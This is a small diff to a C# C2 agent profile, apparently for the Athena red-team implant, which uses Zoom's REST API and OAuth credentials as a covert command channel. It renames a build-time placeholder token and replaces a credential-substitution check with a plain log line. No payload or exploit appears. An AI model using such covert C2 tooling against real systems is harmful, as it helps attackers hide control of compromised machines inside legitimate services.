@@ -28,7 +28,7 @@ namespace Agent.Profiles
         private ILogger logger { get; set; }
 
         // ---- C2 parameters (substituted at build time by builder.buildZoom) ----
-        private string accountId = "account_id";
+        private string accountId = "zoom_account_id";
         private string clientId = "client_id";
         private string clientSecret = "client_secret";
         private string userId = "user_id";
@@ -77,13 +77,13 @@ namespace Agent.Profiles
             this._client = new HttpClient(handler);
             this._client.Timeout = TimeSpan.FromSeconds(30);
 
-            // Startup self-check: surfaces whether build-time substitution happened.
-            Console.Error.WriteLine($"[zoom] profile loaded | " +
-                $"account_id={(accountId == "account_id" ? "<UNSUBSTITUTED>" : "set(len=" + accountId.Length + ")")} | " +
-                $"client_id={(clientId == "client_id" ? "<UNSUBSTITUTED>" : "set(len=" + clientId.Length + ")")} | " +
-                $"client_secret={(clientSecret == "client_secret" ? "<UNSUBSTITUTED>" : "set(len=" + clientSecret.Length + ")")} | " +
-                $"channel_id={(channelId == "channel_id" ? "<UNSUBSTITUTED>" : "set(len=" + channelId.Length + ")")} | " +
-                $"api_base={apiBase} | oauth_base={oauthBase}");
+            // NOTE: do NOT use the bare token names (zoom_account_id, client_id, ...)
+            // as string literals anywhere in this file — Athena's builder does a
+            // global text replace of each C2 parameter name, which would corrupt
+            // any literal that happens to match (e.g. the OAuth "account_id" form
+            // field key). The OAuth key below is intentionally a different string
+            // from the substitution token (zoom_account_id).
+            Console.Error.WriteLine("[zoom] profile loaded");
         }
 
         // ===================== Zoom REST API =====================
